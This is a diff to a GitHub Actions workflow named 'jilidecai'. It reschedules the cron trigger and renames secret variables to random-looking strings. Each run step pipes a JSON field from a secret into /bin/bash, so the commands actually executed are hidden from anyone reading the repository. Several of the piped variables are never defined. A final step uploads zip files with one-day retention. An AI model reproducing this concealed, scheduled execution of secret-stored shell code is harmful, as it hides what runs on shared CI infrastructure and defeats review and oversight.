@@ -1,21 +1,25 @@
 name: jilidecai
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '21 2/6 * * *'
 
-jobs:  # 9888
+  schedule:
+    - cron: '1 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jilidecai
         env:
-          mdu40: ${{ secrets.mdu40 }}
+          qiz905: ${{ secrets.qiz905 }}
         run: |
-          echo $mdu40 | jq -r .iptl3819 | /bin/bash
-          echo $igxk9 | jq -r .to6566 | /bin/bash
-          echo $emeiy7 | jq -r .q1 | /bin/bash
-          echo $c82103 | jq -r .rlz94676 | /bin/bash
-          echo $bxpca8677 | jq -r .xakq12685 | /bin/bash
+          printf '%s' "$qiz905" | jq -r .nqbuo9335 | /bin/bash
+          echo $jh16 | jq -r .cn6596 | /bin/bash
+          echo $ngnr9 | jq -r .n09586 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YGzkwlQa
+          path: "*.zip"
+          retention-days: 1
